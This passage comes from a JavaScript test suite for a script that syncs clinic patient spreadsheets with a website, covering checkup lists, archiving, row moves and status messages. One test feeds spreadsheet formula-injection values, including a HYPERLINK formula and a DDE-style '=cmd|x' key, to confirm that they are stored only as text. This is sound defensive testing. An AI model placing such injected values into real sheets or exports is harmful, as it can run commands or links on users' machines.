  const a = world({ tabs: [GUL], patients: ALL_PATIENTS, install: false, helpers: false, checkupBook: false });
  scripted(a.env);
  a.env.ctx.aajSetup();
  const lastA = a.env.dialogs[a.env.dialogs.length - 1].text;
  assert.match(lastA, /Checkup list not updated: the "Checkup karwaliya" sheet could not be opened/);
  assert.match(lastA, /The sync itself works; only the nightly list of checkup patients is off until this is fixed\./);
  assert.equal(ours(a.env).length, 4, 'and the sync is installed');
  const b = world({ tabs: [GUL], patients: ALL_PATIENTS, install: false, helpers: false });
  scripted(b.env);
  b.env.ctx.aajSetup();
  assert.ok(!/Checkup list/.test(b.env.dialogs[b.env.dialogs.length - 1].text));
  assert.equal(b.env.props.document.get('ckNote'), undefined);
});

test('the checkup sheet and its tab can be changed in Script Properties (CHECKUP_SHEET_ID, CHECKUP_TAB)', () => {
  const w = world({ rows: { [GUL]: CHECKUP_ROWS }, patients: BASE_PATIENTS, checkupBook: false });
  const other = w.env.addBook('other-book-id', 'Another sheet');
  w.env.props.script.set('CHECKUP_SHEET_ID', 'other-book-id');
  w.env.props.script.set('CHECKUP_TAB', 'My checkups');
  settle(w.env, 3);
  w.env.at(TODAY, '23:58'); w.env.ticks(1);
  w.env.at(NEXT, '00:05'); w.env.ticks(1);
  assert.equal(other.getSheetByName('My checkups').used().rows, 3);
});

test('the secret and the sync power: nothing in the script reads a secret from Script Properties, and the file says what the secret can do', () => {
  const src = fs.readFileSync(SCRIPT_PATH, 'utf8');
  assert.ok(!/getScriptProperties\(\)\.getProperty\('AAJ_SYNC_SECRET'\)/.test(src));
  assert.ok(/WHAT THE SECRET CAN DO/.test(src));
  assert.ok(!/MailApp|GmailApp|DriveApp/.test(src), 'no mail and no Drive: the script asks for nothing it does not use');
  const urls = [...src.matchAll(/UrlFetchApp\.fetch\(([^,]*),/g)].map((m) => m[1].trim());
  assert.deepEqual(urls, ["AAJ.URL + '/rest/v1/rpc/aaj_sync'"], 'the only place the script talks to is the website\'s one door');
});

test('Aaj Sync > Status shows the last good sync, the run time used today and each tab\'s day', () => {
  const { env } = synced();
  env.ticks(2);
  env.responder = () => 'OK';
  env.ctx.aajStatus();
  const text = env.dialogs[env.dialogs.length - 1].text;
  assert.match(text, /^Last good sync: 09 Oct \d\d:\d\d\n/);
  assert.match(text, /Google run time used today: \d+ minutes of about 90/);
  assert.match(text, /Gulshan KHI: list of 2026-10-09/);
  assert.match(text, /North Nazimabad: list of not set up/);
  assert.match(text, /Checkup list: nothing added yet\./);
});

// ------------------------------------------------------------------------------------------------ review round 3 (9 Oct 2026)
test('K1 (owner, 13:20): a row with no Mr# whose Treatment is not a checkup is an existing patient whose Mr# was forgotten: "Needs attention: add the Mr#", no checkup, no patient, never in the nightly checkup list; typing the Mr# repairs the row', () => {
  const rows = [
    ['', 'Faizan Ikram', '', 'Filling & Crown prep', '', 'Waiting', '', '', '', '', '', '03001110401', ''],
    ['', 'Walk Checkup', '', 'Checkup / pain', '', 'Waiting', '', '', '', '', '', '03001110402', ''],
    ['', 'No Treatment Yet', '', '', '', 'Waiting', '', '', '', '', '', '03001110403', ''],
  ];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: [...BASE_PATIENTS, { mr: '9810', name: 'Faizan Ikram', phone: '03001110401' }] });
  settle(env, 3);
  assert.deepEqual(server.state.checkups.map((c) => c.name), ['Walk Checkup'], 'only the row that says Checkup is a checkup');
  assert.equal(server.state.visits.length, 0);
  assert.equal(server.state.patients.length, 4, 'and no patient file was made for anybody');
  const NEED = '✗ Needs attention: add the Mr#. A row with no Mr# is a checkup only when its Treatment says checkup. Look the Mr# up in Healthwire.';
  assert.equal(statusOf(env, GUL, 2), NEED);
  assert.equal(statusOf(env, GUL, 4), NEED, 'a row with no Treatment at all is not a checkup either');
  assert.equal(env.tab(GUL).font(2, colOf(env, GUL, 'website')), '#b91c1c', 'red');
  assert.equal(statusOf(env, GUL, 3), '✓ Checkup patient: no Mr#, no patient file.');
  assert.match(headerOf(env, GUL), /2 need attention/);
  quiet(env, server);                                      // not sent again every minute
  // the nightly list takes the checkup, not the rows that need an Mr#
  env.at(TODAY, '23:58'); env.ticks(1);
  env.at(NEXT, '00:05'); env.ticks(1);
  const ck = ckSheet(env);
  assert.equal(ck.used().rows, 2, 'header and the one checkup');
  assert.equal(ck.text(2, 2), 'Walk Checkup');
  // a person looks the Mr# up in Healthwire and types it: the row is the patient's visit
  const w = world({ rows: { [GUL]: rows }, patients: [...BASE_PATIENTS, { mr: '9810', name: 'Faizan Ikram', phone: '03001110401' }] });
  settle(w.env, 3);
  setCell(w.env, GUL, 2, 'mr', '9810');
  w.env.advance(61000);
  w.env.ticks(2);
  assert.equal(w.server.state.visits.length, 1);
  assert.equal(statusOf(w.env, GUL, 2), '✓ On website');
  assert.match(headerOf(w.env, GUL), /1 need attention/, 'one row still needs its Mr#');
});

test('K2: a row that is cut and pasted somewhere else (or whose name is cleared and typed again) is never read as a deleted row: the visit is adopted by the moved row, not removed and made again', () => {
  const { env, server } = synced();
  const sh = env.tab(GUL);
  const kc = colOf(env, GUL, 'website');
  const v = webVisit(server, 'Sample Person Three');
  const before = server.state.visits.length;
  const r = rowOf(env, GUL, 'Sample Person Three');
  // cut the visible cells of the row and paste them at row 10: the hidden key / base / edit cells stay where they were
  const cells = []; for (let c = 1; c < kc; c++) cells.push(sh._get(r, c));
  for (let c = 1; c < kc; c++) sh._set(r, c, null);
  cells.forEach((cell, i) => { if (cell) sh._set(10, i + 1, cell); });
  env.ctx.aajOnEdit({ range: sh.getRange(10, 1, 1, kc - 1), source: env.book });
  env.touch();
  env.ticks(1);
  assert.equal(server.visitById(v.id), v, 'the visit was not deleted while the moved row settles');
  assert.equal(server.state.removedLog.length, 0, 'no removal was asked for');
  env.advance(61000);
  env.ticks(3);
  assert.equal(server.state.visits.length, before, 'no visit lost, none doubled');
  assert.equal(server.visitById(v.id), v, 'the same visit (same id, same history)');
  assert.equal(v.sheet_key, sh.text(10, colOf(env, GUL, 'sync key')), 'it now belongs to the row it was moved to');
  assert.equal(server.state.removedLog.length, 0);
  assert.ok(!env.tab('Aaj Sync log').values().some((row) => /removed from the website/.test(row.join(' '))), 'nothing was reported as removed');
  assert.equal(statusOf(env, GUL, 10), '✓ On website');
  for (let rr = 2; rr <= 10; rr++) assert.ok(!/Already on this list/.test(statusOf(env, GUL, rr)), `row ${rr} says: ${statusOf(env, GUL, rr)}`);
  quiet(env, server);
  // the name cell is cleared (Delete key) and typed again a moment later
  const r1 = rowOf(env, GUL, 'Sample Person Five');
  const v1 = webVisit(server, 'Sample Person Five');
  assert.equal(v1.status, 'waiting', 'a visit the website would take off the list if its row were deleted');
  setCell(env, GUL, r1, 'patients name', '');
  env.ticks(1);
  assert.equal(server.visitById(v1.id), v1, 'a cleared name cell is not a deleted row');
  setCell(env, GUL, r1, 'patients name', 'Sample Person Five');
  env.advance(61000);
  env.ticks(3);
  assert.equal(server.visitById(v1.id), v1, 'and retyped, it is the same visit');
  assert.equal(server.state.removedLog.length, 0);
  assert.equal(server.state.visits.length, before);
});

test('K5: Set up with an empty answer ("today") on a tab whose rows are already Completed asks once more; "No" asks for the day again; a typed day, or a tab with nothing Completed, is not asked', () => {
  const sure = [];
  const w = world({ tabs: [GUL], patients: ALL_PATIENTS, install: false, helpers: false });
  scripted(w.env, { days: { [GUL]: ['', '08-10-2026'] }, sure: (d) => { sure.push(d); return 'NO'; } });
  w.env.ctx.aajSetup();
  assert.equal(sure.length, 1, 'asked once');
  assert.equal(sure[0].title, GUL);
  assert.equal(sure[0].text, '2 of these 6 patients are marked Completed. A list with Completed patients is usually a day that has finished, and TODAY would make every one of them a visit of today on the website.\n\nAre these really today\'s patients?');
  assert.equal(w.env.dialogs.filter((d) => /Which day/.test(d.text)).length, 2, '"No" asks for the day again');
  assert.equal(archiveSheet(w.env).text(2, 1), '2026-10-08', 'the second answer (an earlier day) archived the rows under that day');
  assert.equal(w.server.state.visits.length, 0, 'no visit was made for today');
  // yes: today
  const y = world({ tabs: [GUL], patients: ALL_PATIENTS, install: false, helpers: false });
  scripted(y.env, { days: { [GUL]: [''] }, sure: 'YES' });
  y.env.ctx.aajSetup();
  assert.equal(y.env.props.document.get('listDate:' + GUL), TODAY);
  assert.equal(dataCells(y.env).length, 6);
  // today typed as a date: a deliberate answer, no question
  const d = world({ tabs: [GUL], patients: ALL_PATIENTS, install: false, helpers: false });
  scripted(d.env, { days: { [GUL]: ['09-10-2026'] }, sure: () => { throw new Error('must not be asked'); } });
  d.env.ctx.aajSetup();
  assert.equal(d.env.props.document.get('listDate:' + GUL), TODAY);
  // a morning list with nothing Completed: no question
  const rows = [['9701', 'Sample Person One', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110001', ''], ['', 'Walk In', '', 'Checkup', '', '', '', '', '', '', '', '03001110099', '']];
  const m = world({ tabs: [GUL], rows: { [GUL]: rows }, patients: ALL_PATIENTS, install: false, helpers: false });
  scripted(m.env, { sure: () => { throw new Error('must not be asked'); } });
  m.env.ctx.aajSetup();
  assert.equal(m.env.props.document.get('listDate:' + GUL), TODAY);
});

test('K6: a Mr# typed with a stray dot or space ("9701.") is the number 9701 in the script and in the Admin -> Import reader: it is sent, not flagged', () => {
  const env0 = createEnv();
  for (const [text, mr] of [['9701.', '9701'], [' 9701. ', '9701'], ['9701..', '9701'], ['146.0', '146'], ['9701', '9701']]) {
    assert.deepEqual(env0.call('aajMrOf', text), { mr, isNew: false }, text);
    assert.deepEqual(web.mrOf(text), { mr, isNew: false }, 'web ' + text);
  }
  assert.deepEqual(env0.call('aajMrOf', '.'), { mr: null, isNew: false });
  assert.equal(env0.call('aajFieldKey', 'mr', '9701.'), '9701', 'the cell text compared between ticks ignores the dot too');
  const rows = [['9701.', 'Sample Person One', '', 'Monthly', '', 'Waiting', '', '', '', '', '', '03001110001', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: BASE_PATIENTS });
  settle(env, 3);
  assert.equal(rowsSent(server)[0].set.mr, '9701', 'the Mr# is sent without the dot');
  assert.equal(server.state.visits.length, 1);
  assert.equal(statusOf(env, GUL, 2), '✓ On website');
  assert.equal(cellOf(env, GUL, 2, 'mr'), '9701.', 'and the typed cell is left alone');
  quiet(env, server);
});

test('K8: the nightly checkup list follows the row\'s own checkup flag: a checkup that became a patient the same day (its Mr# was written into the row) is still listed; Cancelled and No show are not; a row the website never saw counts only when its Treatment says checkup', () => {
  const env0 = createEnv();
  const s = { cfg: { tab: GUL, branch: 'GUL' }, cols: env0.call('aajDetectColumns', fixture.headers[GUL]) };
  const row = (mr, name, treatment, status, extra = {}) => ({ key: '', fp: '', cells: [mr, name, '', treatment, '', status, '', '', '', '', '', '03001110500', ''], visit: '', checkup: false, ...extra });
  const lines = (rows) => env0.call('aajCheckupLines', s, rows, TODAY).map((l) => l.name);
  assert.deepEqual(lines([
    row('50001', 'Registered Checkup', 'Checkup', 'Completed', { checkup: true, visit: 'v1' }),
    row('50002', 'Registered Cancelled', 'Checkup', 'Cancelled', { checkup: true, visit: 'v2' }),
    row('', 'Did Not Come', 'Checkup', 'No show', { checkup: true, visit: 'v3' }),
    row('9701', 'A Patient', 'Checkup', 'Completed', { visit: 'v4' }),
    row('', 'Needs Mr', 'Filling', 'Waiting', { visit: 'v5' }),
    row('', 'Never Seen Filling', 'Filling', 'Waiting'),
    row('', 'Never Seen Checkup', 'Xray checkup', 'Waiting'),
    row('NEW', 'Never Seen New', 'chek up', ''),
  ]), ['Registered Checkup', 'Never Seen Checkup', 'Never Seen New']);
  // end to end: Check One is registered as a patient during the day, Check Two is cancelled on the website
  const w = ckWorld({ patients: BASE_PATIENTS });
  const c1 = w.server.state.checkups.find((x) => x.name === 'Check One'), c2 = w.server.state.checkups.find((x) => x.name === 'Check Two');
  w.server.addPatient({ mr: '50001', name: 'Check One', phone: '03001110301' });
  w.server.editCheckup(c1.id, { patient_mr: '50001', day_status: 'completed' });
  w.server.editCheckup(c2.id, { day_status: 'cancelled' });
  w.env.ticks(2);
  assert.equal(cellOf(w.env, GUL, 2, 'mr'), '50001', 'the Mr# was written into the row');
  w.env.at(TODAY, '23:58'); w.env.ticks(1);
  w.env.at(NEXT, '00:05'); w.env.ticks(1);
  const ck = ckSheet(w.env);
  assert.deepEqual(ck.values().slice(1).map((r) => r[1]), ['Check One'], 'the registered checkup is listed, the cancelled one is not');
});

test('K9: a crash between the copy to the archive and the marker (or in the middle of the marker) never copies the day twice, and a damaged marker is not trusted', () => {
  const crashOn = (env, test) => {
    const PS = env.sandbox.PropertiesService, orig = PS.getDocumentProperties;
    PS.getDocumentProperties = () => { const p = orig(); const set = p.setProperty; p.setProperty = (k, v) => { if (test(String(k))) throw new Error('Service error: Properties'); return set.call(p, k, v); }; return p; };
    return () => { PS.getDocumentProperties = orig; };
  };
  // (a) the whole marker fails to save: the rows are in the archive, nothing is cleared, no marker
  const a = dayEnd();
  a.env.at(NEXT, '00:05');
  const undoA = crashOn(a.env, (k) => k.startsWith('arch:' + GUL));
  a.env.ticks(1);
  assert.equal(archiveSheet(a.env).used().rows, 8, 'copied once');
  assert.equal(dataCells(a.env).length, 7, 'not cleared');
  undoA();
  a.env.ticks(1);
  assert.equal(archiveSheet(a.env).used().rows, 8, 'the retry did not copy the day again');
  assert.equal(dataCells(a.env).length, 0, 'and it finished: cleared');
  assert.equal(a.env.props.document.get('listDate:' + GUL), NEXT);
  // (b) the first chunk fails: the head is NOT written (chunks first, head last), so there is no marker that lies
  const b = dayEnd();
  b.env.at(NEXT, '00:05');
  const undoB = crashOn(b.env, (k) => k === 'arch:' + GUL + ':0');
  b.env.ticks(1);
  assert.equal(b.env.props.document.get('arch:' + GUL), undefined, 'no head without its chunks');
  assert.equal(b.env.props.document.get('listDate:' + GUL), TODAY, 'the day is not advanced');
  assert.equal(dataCells(b.env).length, 7, 'and nothing is cleared');
  undoB();
  b.env.ticks(1);
  assert.equal(archiveSheet(b.env).used().rows, 8);
  assert.equal(dataCells(b.env).length, 0);
  assert.equal(b.env.props.document.get('listDate:' + GUL), NEXT);
  // (c) a marker whose chunk is missing is read as "no marker": the tab is copied again (nothing twice) and cleared
  const c = dayEnd();
  c.env.at(NEXT, '00:05');
  const undoC = crashOn(c.env, (k) => k.startsWith('arch:' + GUL + ':'));
  c.env.ticks(1);
  undoC();
  c.env.props.document.set('arch:' + GUL, JSON.stringify({ date: TODAY, phase: 'copied', at: 1, chunks: 3 }));      // a head with chunks that are not there
  c.env.ticks(1);
  assert.equal(archiveSheet(c.env).used().rows, 8, 'not copied twice');
  assert.equal(dataCells(c.env).length, 0, 'cleared');
  assert.equal(c.env.props.document.get('listDate:' + GUL), NEXT, 'the day advanced only after the rows were copied and cleared');
  // identical rows are copied one by one, edited ones again
  assert.equal(env0Count(archiveSheet(c.env)), 7);
});
function env0Count(sheet) { let n = 0; for (let r = 2; r <= sheet.used().rows; r++) if (sheet.text(r, 3)) n++; return n; }

test('K13: rows that never reached the website are counted in the log when the archive goes ahead without it', () => {
  const { env, server } = dayEnd();
  env.responder = () => 'OK';
  env.typeRow(GUL, 9, ['', 'Typed At Midnight', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110977', '']);
  env.typeRow(GUL, 10, ['', 'Typed At Midnight Two', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110978', '']);
  server.faults.down = 1000;
  env.at(NEXT, '02:31');
  env.ticks(1);
  assert.equal(env.props.document.get('listDate:' + GUL), NEXT, 'the archive went ahead');
  assert.match(env.tab('Aaj Sync log').values().map((r) => r[3]).join('\n'), /2 of the 9 rows of 2026-10-09 never reached the website \(the last sync did not go through\)\. They are in the archive: Admin > Import can bring them back\./);
});

test('K11: Lahore and Islamabad keep kit and material text in the Token column: the website never fills a blank Token cell there, not even on a row it adds; Gulshan still gets its number', () => {
  const mk = (mr, name, phone) => [mr, name, '', 'Monthly', '', 'Waiting', '', '', '', '', '', phone, ''];
  const { env, server } = world({ tabs: ['Gulberg Lhr', 'Islamabad', GUL], patients: ALL_PATIENTS,
    rows: { 'Gulberg Lhr': [mk('9721', 'Sample Person Eleven', '03001110011')], 'Islamabad': [mk('9731', 'Sample Person Fourteen', '03001110014')], [GUL]: [mk('9701', 'Sample Person One', '03001110001')] } });
  settle(env, 4);
  const tok = (tab, name) => cellOf(env, tab, rowOf(env, tab, name), 'token');
  assert.ok(webVisit(server, 'Sample Person Eleven').token && webVisit(server, 'Sample Person Fourteen').token, 'the website numbered both visits');
  assert.equal(tok('Gulberg Lhr', 'Sample Person Eleven'), '', 'Lahore: the cell stays blank');
  assert.equal(tok('Islamabad', 'Sample Person Fourteen'), '', 'Islamabad: the cell stays blank');
  assert.equal(tok(GUL, 'Sample Person One'), String(webVisit(server, 'Sample Person One').token), 'Gulshan: a blank Token cell is filled');
  // the website changes the number later: still not written there
  server.editVisit(webVisit(server, 'Sample Person Eleven').id, { token: 33 });
  env.ticks(2);
  assert.equal(tok('Gulberg Lhr', 'Sample Person Eleven'), '');
  // a website-only visit added to the Lahore tab comes without a token number
  server.addVisit({ branch: 'LHR', date: TODAY, mr: '9722', status: 'waiting', token: 5 });
  env.ticks(2);
  const r = rowOf(env, 'Gulberg Lhr', 'Sample Person Thirteen');
  assert.ok(r > 2, 'the row was added');
  assert.equal(cellOf(env, 'Gulberg Lhr', r, 'token'), '');
  // a number or kit text typed there is the sheet's own and still goes to the website
  setCell(env, 'Gulberg Lhr', rowOf(env, 'Gulberg Lhr', 'Sample Person Eleven'), 'token', 'Kit 80k');
  env.tickAfter(61000);
  assert.equal(cellOf(env, 'Gulberg Lhr', rowOf(env, 'Gulberg Lhr', 'Sample Person Eleven'), 'token'), 'Kit 80k');
  quiet(env, server);
});

test('K12: a typed edit fires on-edit AND on-change: on-change ignores EDIT (the on-edit run already marked it) but still notices a deleted, inserted or moved row', () => {
  const { env } = synced();
  env.ticks(3);
  const doc = env.props.document;
  assert.equal(doc.get('dirty'), undefined, 'a quiet sheet');
  const rteKey = [...doc.keys()].find((k) => k.startsWith('rte:'));
  env.ctx.aajOnChange({ changeType: 'EDIT', source: env.book });
  assert.equal(doc.get('dirty'), undefined, 'EDIT: nothing marked, no run time counted');
  assert.equal([...doc.keys()].find((k) => k.startsWith('rte:')), rteKey);
  env.ctx.aajOnChange({ changeType: 'FORMAT', source: env.book });
  assert.equal(doc.get('dirty'), undefined, 'FORMAT: nothing either');
  env.ctx.aajOnChange({ changeType: 'REMOVE_ROW', source: env.book });
  assert.ok(doc.get('dirty'), 'a deleted row is noticed');
  doc.delete('dirty');
  env.ctx.aajOnChange({ changeType: 'INSERT_ROW', source: env.book });
  assert.ok(doc.get('dirty'), 'an inserted row is noticed');
  doc.delete('dirty');
  env.ctx.aajOnChange({ changeType: 'OTHER', source: env.book });
  assert.ok(doc.get('dirty'), 'a sort or a paste of whole rows is noticed');
  doc.delete('dirty');
  setCell(env, GUL, 2, 'treatment details', 'typed');
  assert.ok(doc.get('dirty'), 'and a typed edit is marked by aajOnEdit');
});

test('R2: the website\'s list is data, not instructions: a visit with a key the sync did not make (a formula, a made-up key) is never added to the sheet, and nothing becomes a formula', () => {
  const { env, server } = synced();
  const sh = env.tab(GUL);
  const rowsBefore = sh.used().rows;
  const orig = env.fetchHandler;
  env.fetchHandler = (req) => {
    const r = orig(req);
    const body = JSON.parse(r.body);
    for (const t of body.tabs || []) {
      if (!t.visits || !t.visits.length) continue;
      const base = t.visits[0];
      t.visits.push({ ...base, key: 'W-=HYPERLINK("http://example.invalid","x")', id: 'bad-1', name: 'Formula Key', mr: '' },
        { ...base, key: 'W-NOTAUUID', id: 'bad-2', name: 'Made Up Key', mr: '' }, { ...base, key: '=cmd|x', id: 'bad-3', name: 'Restore Formula', mr: '', kind: 'checkup' });
      t.removed = [...(t.removed || []), { key: '=cmd|x', action: 'restore', message: 'Not removed: this checkup is already a patient, or has follow-up notes on the website.' }];
    }
    return { code: r.code, body: JSON.stringify(body) };
  };
  server.editVisit(webVisit(server, 'Sample Person One').id, { details: 'changed so the list comes back' });
  env.ticks(4);
  assert.equal(sh.used().rows, rowsBefore, 'no row was added for the strange keys, then or later (no row per minute)');
  assert.equal(env.stats.formulaWrites, 0, 'nothing was written as a formula');
  for (let r = 1; r <= sh.used().rows; r++) for (let c = 1; c <= sh.used().cols; c++) assert.ok(!/HYPERLINK|NOTAUUID|cmd\|x/.test(sh.text(r, c)), `cell ${r},${c}`);
  // a good key from the same list is still added
  server.addPatient({ mr: '9890', name: 'Good Key Person', phone: '03001110890' });
  server.addVisit({ branch: 'GUL', date: TODAY, mr: '9890', status: 'waiting' });
  env.ticks(3);
  assert.ok(rowOf(env, GUL, 'Good Key Person'), 'a real website visit is still added');
  // defence in depth: even a row that reached the writer with a formula in its key, base or status is written as text
  const st = env.ctx.aajSafeText_('=1+1');
  assert.equal(st, "'=1+1");
  const ctx = env.ctx.aajNewCtx_(env.ctx.aajLoadState_(), true);
  const e = { cfg: { tab: GUL, branch: 'GUL' }, sheet: sh };
  env.ctx.aajReadTab_(e);
  e.scan = env.ctx.aajScanTab(e.grid, e.cols, e.hc, Date.now(), TODAY, { newKey: env.ctx.aajNewKey_, branch: 'GUL' });
  env.ctx.aajApply_(ctx, e, { writes: [], helper: {}, status: {}, appends: [{ key: '=1+1', cells: { name: 'Direct Call' }, base: '=2+2', status: '=3+3', level: 'ok', patient: 'Direct Call' }] });
  assert.equal(env.stats.formulaWrites, 0, 'nothing became a formula');
  const rd = rowOf(env, GUL, 'Direct Call');
  assert.ok(rd > 1, 'the row was written');
  assert.equal(sh.text(rd, colOf(env, GUL, 'sync key')), '=1+1');
  assert.equal(sh.text(rd, colOf(env, GUL, 'sync base')), '=2+2');
  assert.equal(sh.text(rd, colOf(env, GUL, 'website')), '=3+3');
});

test('K7: the same checkup patient in two rows (same name and phone, no Mr# to tell them by) is flagged on both rows; two people with no phone are not guessed; deleting one row clears the warning on the other', () => {
  const rows = [
    ['', 'Twin Checkup', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110555', ''],
    ['', 'Twin Checkup', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '0300 1110555', ''],
    ['', 'Other Person', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110556', ''],
    ['', 'No Phone', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '', ''],
    ['', 'No Phone', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '', ''],
  ];
  const { env, server } = world({ rows: { [GUL]: rows } });
  settle(env, 3);
  assert.equal(server.state.checkups.length, 5, 'five checkups: the sheet cannot tell whether two rows are one person, so it says so');
  const WARN = '\u26a0 Same checkup patient twice on today\'s list (same name and phone). Delete one of the rows.';
  assert.equal(statusOf(env, GUL, 2), WARN);
  assert.equal(statusOf(env, GUL, 3), WARN);
  assert.equal(statusOf(env, GUL, 4), '\u2713 Checkup patient: no Mr#, no patient file.');
  assert.equal(statusOf(env, GUL, 5), '\u2713 Checkup patient: no Mr#, no patient file.', 'no phone: never guessed to be the same person');
  assert.match(headerOf(env, GUL), /2 need attention/);
  env.ticks(3);                                                // quiet minutes (the website sends no list)
  assert.equal(statusOf(env, GUL, 2), WARN, 'the warning stays through quiet minutes');
  server.addCheckup({ branch: 'GUL', date: TODAY, name: 'Unrelated Walk', phone: '03001110999', checkup_for: 'Checkup' });
  env.ticks(3);                                                // a new list arrives
  assert.equal(statusOf(env, GUL, 2), WARN, 'and through the next lists');
  assert.equal(statusOf(env, GUL, 3), WARN);
  env.deleteRows(GUL, 3);
  env.ticks(2);
  assert.equal(server.state.checkups.length, 5, 'the deleted row\'s checkup is gone from the website (four rows and the unrelated walk-in remain)');
  assert.equal(statusOf(env, GUL, 2), '\u2713 On website', 'and the other row is no longer flagged');
  assert.match(headerOf(env, GUL), /^Website \u00b7 \d\d:\d\d \u2713$/);
});

// @@MORE@@
